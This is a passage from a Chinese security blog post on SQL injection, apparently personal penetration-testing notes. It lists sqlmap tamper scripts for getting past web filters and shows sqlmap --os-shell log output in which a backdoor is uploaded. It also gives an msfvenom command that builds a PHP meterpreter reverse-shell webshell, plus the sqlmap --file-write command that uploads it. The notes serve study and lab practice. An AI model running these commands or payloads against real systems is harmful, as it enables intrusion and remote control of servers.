用双unicode替换&#x27;（例如&#x27;-&gt;％00％27）</span><br><span class="line">appendnullbyte.py                在payload的末尾附加NULL字节字符（％00）</span><br><span class="line">base64encode.py                  对payload中的所有字符进行base64编码</span><br><span class="line">between.py                       用运算符（&#x27;&gt;&#x27;）替换&#x27;NOT BETWEEN 0 AND＃&#x27;，用运算符（&#x27;=&#x27;）替换&#x27;BETWEEN＃AND＃&#x27;</span><br><span class="line">bluecoat.py                      用随机空白字符替换语句后的空格字符，之后用运算符LIKE替换字符&#x27;=&#x27;</span><br><span class="line">chardoubleencode.py              对payload中的所有字符进行双重URL编码（例如SELECT-&gt;％2553％2545％254C％2545％2543％2554）</span><br><span class="line">charencode.py                    对payload中所有字符进行URL编码（例如SELECT-&gt;％53％45％4C％45％43％54）</span><br><span class="line">charunicodeencode.py             对payload中的所有字符进行unicode编码（例如SELECT-&gt;％u0053％u0045％u004C％u0045％u0043％u0054）</span><br><span class="line">charunicodeescape.py             使用Unicode转义payload中的未编码字符（例如SELECT-&gt;\u0053\u0045\u004C\u0045\u0043\u0054）</span><br><span class="line">commalesslimit.py                用&#x27;LIMIT N OFFSET M&#x27;替换（MySQL）实例，例如&#x27;LIMIT M，N&#x27;</span><br><span class="line">commalessmid.py                  用&#x27;MID（A FROM B FOR C）&#x27;替换（MySQL）实例，例如&#x27;MID（A，B，C）&#x27;</span><br><span class="line">commentbeforeparentheses.py      在括号前加（内联）注释（例如（（-&gt;/**/（）</span><br><span class="line">concat2concatws.py               用&#x27;CONCAT_WS（MID（CHAR（0），0，0），A，B）&#x27;替换（MySQL）实例，例如&#x27;CONCAT（A，B）&#x27; 。</span><br><span class="line">equaltolike.py                   将（&#x27;=&#x27;）运算符替换为&#x27;LIKE&#x27;</span><br><span class="line">escapequotes.py                  斜杠转义单引号和双引号（例如&#x27;-&gt; \&#x27;）</span><br><span class="line">great.py                         替换运算符（&#x27;&gt;&#x27; ）和&#x27;GREATEST&#x27;对应</span><br><span class="line">Halfversionedmorekeywords.py     在每个关键字前添加mysql注释</span><br><span class="line">hex2char.py                      替换每个（MySQL）0x等效的CONCAT（CHAR（），...）编码字符串</span><br><span class="line">htmlencode.py                    用HTML编码（使用代码点）所有非字母数字字符（例如&#x27;-&gt;&#x27;）</span><br><span class="line">ifnull2casewhenisnull.py         绕过对 IFNULL 过滤,替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</span><br><span class="line">ifnull2ifisnull.py               用&#x27;IF（ISNULL（A），B）替换&#x27;IFNULL（A，B）&#x27;之类的实例，A）&#x27;对应</span><br><span class="line">informationschemacomment.py      在所有出现的（MySQL）“information_schema”标识符的末尾添加一个内联注释（/ ** /）</span><br><span class="line">least.py                         用&#x27;LEAST&#x27;对应替换运算符（&#x27;&gt;&#x27;）</span><br><span class="line">lowercase.py                     用小写替换每个关键字字符（例如SELECT-&gt;select）</span><br><span class="line">luanginx.py                      LUA-NginxWAF绕过（例如Cloudflare）</span><br><span class="line">modsecurityversioned.py          包含带有（MySQL）版本注释的完整查询</span><br><span class="line">modsecurityzeroversioned.py      包含带有（MySQL）零版本注释的完整查询</span><br><span class="line">multiplespaces.py                在SQL关键字周围添加多个空格（&#x27;&#x27;）</span><br><span class="line">overlongutf8.py                  将payload中的所有（非字母数字）字符转换为超长UTF8（例如&#x27;-&gt;％C0％A7）</span><br><span class="line">overlongutf8more.py              将payload中所有字符转换为超长UTF8（例如SELECT-&gt;％C1％93％C1％85％C1％8C％C1％85％C1％83％C1％94）</span><br><span class="line">percent.py                       在每个字符前面添加一个百分号（&#x27;％&#x27;） （例如SELECT-&gt;％S％E％L％E％C％T）</span><br><span class="line">plus2concat.py                   替换运算符（&#x27;+&#x27;）与（MsSQL）函数CONCAT（）对应</span><br><span class="line">plus2fnconcat.py                 用（MsSQL）ODBC函数&#123;fn CONCAT（）&#125;替换为（&#x27;+&#x27;）</span><br><span class="line">randomcase.py                    用随机大小写值替换每个关键字字符（例如SELECT-&gt; SEleCt）</span><br><span class="line">randomcomments.py                在SQL关键字内添加随机内联注释（例如SELECT-&gt; S/**/E/**/LECT）</span><br><span class="line">sp_password.py                   将（MsSQL）函数&#x27;sp_password&#x27;附加到payload的末尾，以便从DBMS日志中自动进行混淆</span><br><span class="line">space2comment.py                 空格替换为/**_**/</span><br><span class="line">space2dash.py                    空格替换为-加随机字符</span><br><span class="line">space2hash.py                    空格替换为#加随机字符</span><br><span class="line">space2morecomment.py             空格替换为/**_**/</span><br><span class="line">space2morehash.py                空格替换为#加随机字符及换行符</span><br><span class="line">space2mssqlblank.py              空格替换为其他空符号（MsSQL）</span><br><span class="line">space2mssqlhash.py               空格替换为%23%0A(MsSQL)</span><br><span class="line">space2mysqlblank.py              空格替换为其它空符号（Mysql）</span><br><span class="line">space2mysqldash.py               替换空格字符（&#x27;&#x27;）（’–‘）后跟一个破折号注释一个换行（’n’）</span><br><span class="line">space2plus.py                    用加号（&#x27;+&#x27;）替换空格字符（&#x27;&#x27;）</span><br><span class="line">space2randomblank.py             用空格中的随机空白字符替换空格字符（&#x27;&#x27;）有效的替代字符集</span><br><span class="line">substring2leftright.py           用LEFT和RIGHT替换PostgreSQL SUBSTRING</span><br><span class="line">symbolicologic.py                用符号（&amp;&amp;和||）替换AND和OR逻辑运算符</span><br><span class="line">unionalltounion.py               用UNION SELECT替换UNION ALL SELECT</span><br><span class="line">unmagicquotes.py                 用多字节组合％BF％27替换引号字符（&#x27;），并在末尾添加通用注释</span><br><span class="line">uppercase.py-                    用大写值替换每个关键字字符（例如select -&gt; SELECT）</span><br><span class="line">varnish.py                       添加HTTP标头&#x27;X-originating-IP&#x27;以绕过Varnish防火墙</span><br><span class="line">versionedkeywords.py             用注释封装每个非函数的关键字</span><br><span class="line">versionedmorekeywords.py         将每个关键字包含（MySQL）版本注释</span><br><span class="line">xforwardedfor.py                 添加伪造的HTTP标头&#x27;X-Forwarded-For</span><br></pre></td></tr></table></figure>

<h3 id="–os-shell"><a href="#–os-shell" class="headerlink" title="–os-shell"></a>–os-shell</h3><p>使用 os shell 成功时会同时上传 file stager 和 backdoor</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[21:30:16] [INFO] the file stager has been successfully uploaded on &#x27;/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/&#x27; - http://192.168.3.135:80/se3reTdir777/uploads/tmpuxvlx.php                                                    [21:30:16] [INFO] the backdoor has been successfully uploaded on &#x27;/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/&#x27; - http://192.168.3.135:80/se3reTdir777/uploads/tmpbfwfq.php </span><br></pre></td></tr></table></figure>

<p>file stager 可以直接上传文件</p>
<p>执行系统命令就是利用的这个后门</p>
<h3 id="–file-write-写入webshell"><a href="#–file-write-写入webshell" class="headerlink" title="–file-write 写入webshell"></a>–file-write 写入webshell</h3><p>生成webshell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.3.132 LPORT=1234 &gt; shell.php</span><br></pre></td></tr></table></figure>

<p>上传文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap ... --file-write [file] --file-dest [path/filename]</span><br></pre></td></tr></table></figure>

</div><div class="article-licensing box"><div class="licensing-title"><p>SQL注入</p><p><a href="http://example.com/2020/02/01/sql-injection/">http://example.com/2020/02/01/sql-injection/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>lll</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2020-02-01</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-08-12</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/02/26/windows-security/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Windows 服务器安全</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/01/22/mit-ai/"><span class="level-item">mit-ai</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="lll"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">lll</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">55</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">8</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">16</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/1klnd" target="_blank" rel="noopener">关注我</a></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/AI/"><span class="level-start"><span class="level-item">AI</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Powershell/"><span class="level-start"><span class="level-item">Powershell</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/metasploit/"><span class="level-start"><span class="level-item">metasploit</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/notes/"><span class="level-start"><span class="level-item">notes</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/python/"><span class="level-start"><span class="level-item">python</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/vulnhub/"><span class="level-start"><span class="level-item">vulnhub</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="level-start"><span class="level-item">漏洞复现</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-12T05:56:35.000Z">2022-07-12</time></p><p class="title"><a href="/2022/07/12/practical-reverse-engineering/">逆向工程实战</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-10-06T08:39:18.000Z">2021-10-06</time></p><p class="title"><a href="/2021/10/06/etw/">A Primer On Event Tracing For Windows (ETW)</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-18T13:39:32.000Z">2021-09-18</time></p><p class="title"><a href="/2021/09/18/PE/">PE 结构</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-30T05:59:59.000Z">2021-08-30</time></p><p class="title"><a href="/2021/08/30/struts2/">Struts2 漏洞 S2-001</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-22T03:51:23.000Z">2021-07-22</time></p><p class="title"><a href="/2021/07/22/vulhub-debug/">vulhub-debug</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/07/"><span class="level-start"><span class="level-item">七月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/10/"><span class="level-start"><span class="level-item">十月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/09/"><span class="level-start"><span class="level-item">九月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">八月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/07/"><span class="level-start"><span class="level-item">七月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/10/"><span class="level-start"><span class="level-item">十月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/08/"><span class="level-start"><span class="level-item">八月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">七月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/06/"><span class="level-start"><span class="level-item">六月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/05/"><span class="level-start"><span class="level-item">五月 2020</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/04/"><span class="level-start"><span class="level-item">四月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/03/"><span class="level-start"><span class="level-item">三月 2020</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/02/"><span class="level-start"><span class="level-item">二月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/01/"><span class="level-start"><span class="level-item">一月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/11/"><span class="level-start"><span class="level-item">十一月 2019</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/10/"><span class="level-start"><span class="level-item">十月 2019</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/09/"><span class="level-start"><span class="level-item">九月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/AI/"><span class="tag">AI</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ETW/"><span class="tag">ETW</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Powershell/"><span class="tag">Powershell</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Struts2/"><span class="tag">Struts2</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows/"><span class="tag">Windows</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Writeup/"><span class="tag">Writeup</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/flask/"><span class="tag">flask</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/metasploit/"><span class="tag">metasploit</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/shell/"><span class="tag">shell</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssr/"><span class="tag">ssr</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tables/"><span class="tag">tables</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tricks/"><span class="tag">tricks</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/vulnhub/"><span class="tag">vulnhub</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tag">渗透测试</span><span class="tag">3</span></a></div></div></div></div></div><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#SQLi-labs-题解"><span class="level-left"><span class="level-item">1</span><span class="level-item">SQLi-labs 题解</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Updatexml-extractvalue-5"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">Updatexml, extractvalue -5</span></span></a></li><li><a class="level is-mobile" href="#布尔盲注-8"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">布尔盲注 -8</span></span></a></li><li><a class="level is-mobile" href="#时间盲注-9"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">时间盲注 -9</span></span></a></li><li><a class="level is-mobile" href="#拆分-23"><span class="level-left"><span class="level-item">1.4</span><span class="level-item">拆分 -23</span></span></a></li><li><a class="level is-mobile" href="#二次注入-24"><span class="level-left"><span class="level-item">1.5</span><span class="level-item">二次注入 -24</span></span></a></li><li><a class="level is-mobile" href="#过滤-25-26-27"><span class="level-left"><span class="level-item">1.6</span><span class="level-item">过滤 -25 -26 -27</span></span></a></li></ul></li><li><a class="level is-mobile" href="#注入手法"><span class="level-left"><span class="level-item">2</span><span class="level-item">注入手法</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#联合注入"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">联合注入</span></span></a></li><li><a class="level is-mobile" href="#宽字节注入"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">宽字节注入</span></span></a></li><li><a class="level is-mobile" href="#报错注入"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">报错注入</span></span></a></li><li><a class="level is-mobile" href="#布尔盲注"><span class="level-left"><span class="level-item">2.4</span><span class="level-item">布尔盲注</span></span></a></li><li><a class="level is-mobile" href="#时间盲注"><span class="level-left"><span class="level-item">2.5</span><span class="level-item">时间盲注</span></span></a></li><li><a class="level is-mobile" href="#堆叠注入"><span class="level-left"><span class="level-item">2.6</span><span class="level-item">堆叠注入</span></span></a></li></ul></li><li><a class="level is-mobile" href="#PDO"><span class="level-left"><span class="level-item">3</span><span class="level-item">PDO</span></span></a></li><li><a class="level is-mobile" href="#带外注入"><span class="level-left"><span class="level-item">4</span><span class="level-item">带外注入</span></span></a></li><li><a class="level is-mobile" href="#二阶注入"><span class="level-left"><span class="level-item">5</span><span class="level-item">二阶注入</span></span></a></li><li><a class="level is-mobile" href="#注入点"><span class="level-left"><span class="level-item">6</span><span class="level-item">注入点</span></span></a></li><li><a class="level is-mobile" href="#Bypass"><span class="level-left"><span class="level-item">7</span><span class="level-item">Bypass</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#字符串操作"><span class="level-left"><span class="level-item">7.1</span><span class="level-item">字符串操作</span></span></a></li><li><a class="level is-mobile" href="#变量"><span class="level-left"><span class="level-item">7.2</span><span class="level-item">变量</span></span></a></li><li><a class="level is-mobile" href="#条件表达式"><span class="level-left"><span class="level-item">7.3</span><span class="level-item">条件表达式</span></span></a></li><li><a class="level is-mobile" href="#子查询"><span class="level-left"><span class="level-item">7.4</span><span class="level-item">子查询</span></span></a></li><li><a class="level is-mobile" href="#注释"><span class="level-left"><span class="level-item">7.5</span><span class="level-item">注释</span></span></a></li><li><a class="level is-mobile" href="#其他"><span class="level-left"><span class="level-item">7.6</span><span class="level-item">其他</span></span></a></li></ul></li><li><a class="level is-mobile" href="#其他-1"><span class="level-left"><span class="level-item">8</span><span class="level-item">其他</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#SMB-Relay-攻击"><span class="level-left"><span class="level-item">8.1</span><span class="level-item">SMB Relay 攻击</span></span></a></li><li><a class="level is-mobile" href="#异或注入"><span class="level-left"><span class="level-item">8.2</span><span class="level-item">异或注入</span></span></a></li><li><a class="level is-mobile" href="#无列名注入"><span class="level-left"><span class="level-item">8.3</span><span class="level-item">无列名注入</span></span></a></li><li><a class="level is-mobile" href="#无法使用information-schema"><span class="level-left"><span class="level-item">8.4</span><span class="level-item">无法使用information_schema</span></span></a></li></ul></li><li><a class="level is-mobile" href="#后续操作"><span class="level-left"><span class="level-item">9</span><span class="level-item">后续操作</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#写入-webshell"><span class="level-left"><span class="level-item">9.1</span><span class="level-item">写入 webshell</span></span></a></li><li><a class="level is-mobile" href="#提权"><span class="level-left"><span class="level-item">9.2</span><span class="level-item">提权</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#UDF-提权"><span class="level-left"><span class="level-item">9.2.1</span><span class="level-item">UDF 提权</span></span></a></li><li><a class="level is-mobile" href="#MOF-提权"><span class="level-left"><span class="level-item">9.2.2</span><span class="level-item">MOF 提权</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#Oracle"><span class="level-left"><span class="level-item">10</span><span class="level-item">Oracle</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#联合注入-1"><span class="level-left"><span class="level-item">10.1</span><span class="level-item">联合注入</span></span></a></li><li><a class="level is-mobile" href="#报错注入-1"><span class="level-left"><span class="level-item">10.2</span><span class="level-item">报错注入</span></span></a></li><li><a class="level is-mobile" href="#布尔盲注-1"><span class="level-left"><span class="level-item">10.3</span><span class="level-item">布尔盲注</span></span></a></li><li><a class="level is-mobile" href="#时间盲注-1"><span class="level-left"><span class="level-item">10.4</span><span class="level-item">时间盲注</span></span></a></li></ul></li><li><a class="level is-mobile" href="#SQL-Server"><span class="level-left"><span class="level-item">11</span><span class="level-item">SQL Server</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#联合注入-2"><span class="level-left"><span class="level-item">11.1</span><span class="level-item">联合注入</span></span></a></li><li><a class="level is-mobile" href="#报错注入-2"><span class="level-left"><span class="level-item">11.2</span><span class="level-item">报错注入</span></span></a></li><li><a class="level is-mobile" href="#布尔盲注-2"><span class="level-left"><span class="level-item">11.3</span><span class="level-item">布尔盲注</span></span></a></li><li><a class="level is-mobile" href="#时间盲注-2"><span class="level-left"><span class="level-item">11.4</span><span class="level-item">时间盲注</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Postgresql"><span class="level-left"><span class="level-item">12</span><span class="level-item">Postgresql</span></span></a></li><li><a class="level is-mobile" href="#Sqlmap"><span class="level-left"><span class="level-item">13</span><span class="level-item">Sqlmap</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#读源码"><span class="level-left"><span class="level-item">13.1</span><span class="level-item">读源码</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#目录结构"><span class="level-left"><span class="level-item">13.1.1</span><span class="level-item">目录结构</span></span></a></li><li><a class="level is-mobile" href="#sqlmap-py"><span class="level-left"><span class="level-item">13.1.2</span><span class="level-item">sqlmap.py</span></span></a></li><li><a class="level is-mobile" href="#lib-controller-controller-py"><span class="level-left"><span class="level-item">13.1.3</span><span class="level-item">lib/controller/controller.py</span></span></a></li><li><a class="level is-mobile" href="#lib-controller-action-py"><span class="level-left"><span class="level-item">13.1.4</span><span class="level-item">lib/controller/action.py</span></span></a></li></ul></li><li><a class="level is-mobile" href="#自带tampers"><span class="level-left"><span class="level-item">13.2</span><span class="level-item">自带tampers</span></span></a></li><li><a class="level is-mobile" href="#–os-shell"><span class="level-left"><span class="level-item">13.3</span><span class="level-item">–os-shell</span></span></a></li><li><a class="level is-mobile" href="#–file-write-写入webshell"><span class="level-left"><span class="level-item">13.4</span><span class="level-item">–file-write 写入webshell</span></span></a></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="饱食终日，无所事事" height="28"></a><p class="is-size-7"><span>&copy; 2022 lll</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>